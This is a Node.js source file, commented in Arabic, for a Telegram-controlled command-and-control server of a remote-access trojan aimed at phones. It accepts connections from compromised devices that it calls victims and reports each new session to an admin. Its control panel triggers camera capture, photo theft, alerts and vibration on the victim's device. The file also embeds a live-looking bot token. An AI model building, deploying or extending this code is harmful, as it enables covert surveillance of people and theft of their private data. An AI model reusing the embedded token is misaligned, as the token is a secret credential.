const { Telegraf, Markup } = require('telegraf');
const net = require('net');

const TOKEN = "8113157717:AAHUdnbkHj19lJHFhX4g93-GVSq9aE6nuLo";
const ADMIN_ID = 6654753506; 
const PORT = 10000;

let activeAgents = {}; 
const bot = new Telegraf(TOKEN);

// --- 1. خادم الاستقبال الذكي (C2 Server) ---
const server = net.createServer((socket) => {
    socket.setKeepAlive(true, 60000); // منع انقطاع الاتصال المفاجئ
    
    socket.once('data', (data) => {
        try {
            const info = JSON.parse(data.toString()); // استقبال بيانات الجهاز (البطارية، الاسم)
            const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
            activeAgents[agentId] = { socket, info };

            // إشعار لمرة واحدة فقط عند دخول الضحية
            bot.telegram.sendMessage(ADMIN_ID, 
                `✅ **جلسة جديدة نشطة!**\n\n` +
                `📱 الجهاز: ${info.hostname}\n` +
                `🔋 البطارية: ${info.battery}%\n` +
                `🖥️ النظام: ${info.platform}\n` +
                `🔌 الشحن: ${info.charging ? 'متصل' : 'غير متصل'}\n\n` +
                `استخدم /control للتحكم.`, { parse_mode: 'Markdown' });
        } catch (e) {
            console.log("Error parsing initial data");
        }
    });

    socket.on('error', () => { /* صمت مطبق عند الخطأ */ });
    socket.on('close', () => { /* مسح الجلسة بهدوء */ });
});

server.listen(PORT, '0.0.0.0');

// --- 2. لوحة التحكم الصامتة ---
bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ مختبر الاختراق جاهز. لا رسائل تلقائية بعد الآن.', 
        Markup.inlineKeyboard([
            [Markup.button.callback('📱 الأجهزة المتصلة (الجلسات)', 'list_agents')],
            [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
        ])
    );
});

bot.action('list_agents', (ctx) => {
    const ids = Object.keys(activeAgents);
    if (ids.length === 0) return ctx.reply("❌ لا توجد جلسات نشطة حالياً.");
    
    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id} (${activeAgents[id].info.battery}%)`, `manage_${id}`)]);
    ctx.reply("🌐 الجلسات المفتوحة الآن:", Markup.inlineKeyboard(buttons));
});

bot.action(/^manage_/, (ctx) => {
    const id = ctx.match.input.split('_')[1];
    ctx.reply(`🎮 التحكم في ${id}:`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 كاميرا', `cmd_${id}_cam`), Markup.button.callback('🖼️ سحب صور', `cmd_${id}_pull`)],
            [Markup.button.callback('🔔 إشعار', `cmd_${id}_alert`), Markup.button.callback('📳 اهتزاز', `cmd_${id}_vibrate`)]
        ])
    );
});

bot.launch();
